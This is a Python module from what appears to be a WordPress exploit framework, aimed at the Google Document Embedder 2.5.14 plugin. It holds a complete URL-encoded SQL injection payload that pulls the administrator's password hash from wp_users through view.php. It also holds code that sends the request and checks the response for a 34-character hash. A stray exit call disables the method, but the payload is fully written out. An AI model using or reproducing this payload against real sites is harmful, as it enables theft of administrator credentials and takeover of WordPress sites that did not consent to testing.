import http.client

from bs4 import BeautifulSoup
from exploits.exploitsql import ExploitSql


class GoogleDocEmbedder(ExploitSql):
	@staticmethod
	def getname():
		return "Google Document Embedder"

	@staticmethod
	def getversion():
		return '2.5.14'

	@staticmethod
	def getexploit():
		return "/wp-content/plugins/google-document-embedder/view.php?embedded=1&gpid=0%%20UNION%%20SELECT%%201,%%202,%%" \
			"203,%%20CONCAT%%28CAST%%28CHAR%%2897,%%2058,%%2049,%%2058,%%20123,%%20115,%%2058,%%2054,%%2058,%%2034," \
			"%%20118,%%20119,%%2095,%%2099,%%20115,%%20115,%%2034,%%2059,%%20115,%%2058%%29%%20as%%20CHAR%%29," \
			"%%20LENGTH%%28user_pass%%29,%%20CAST%%28CHAR%%2858,%%2034%%29%%20as%%20CHAR%%29,%%20user_pass," \
			"%%20CAST%%28CHAR%%2834,%%2059,%%20125%%29%%20as%%20CHAR%%29%%29%%20FROM%%20%%60wp_users%%60%%20WHERE%%20ID=1"

	def exploit(self):
		exit('here')
		connection = http.client.HTTPConnection(self.hostname)
		connection.request("GET", self.getexploit())
		response = connection.getresponse().read()
		soup = BeautifulSoup(response)
		for link in soup.findAll('link'):
			result = link.get('href')
			if len(result) == 34:
				print('\r\n')
				print(self.getname() + "  " + self.getversion() + " is vulnerable with exploit: \r\n" + self.hostname + self.getexploit())
